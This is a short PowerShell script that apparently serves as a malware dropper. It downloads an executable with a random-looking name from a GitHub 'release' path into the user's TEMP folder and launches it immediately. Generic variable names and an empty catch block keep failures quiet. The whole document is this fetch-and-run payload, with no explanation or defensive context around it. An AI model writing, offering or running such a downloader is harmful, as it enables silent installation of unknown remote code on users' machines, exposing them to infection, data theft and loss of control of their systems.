$someData = @(
    [PSCustomObject]@{a = "https://github.com/directory-release/package/blob/main/DehSJ5K5fGn3.exe"; b = "DehSJ5K5fGn3.exe"}
  );

  foreach ($i in $someData) {
    try {
      $filePath = "$env:TEMP\$($i.b)";
      $download = $true;
      if (Test-Path $filePath) {
        $download = $false;
      }
      if ($download) {
        Invoke-RestMethod -Uri $i.a -OutFile $filePath;
      }
      Start-Process $filePath;
    }
    catch {
      # Error handling (optional)
    }
  }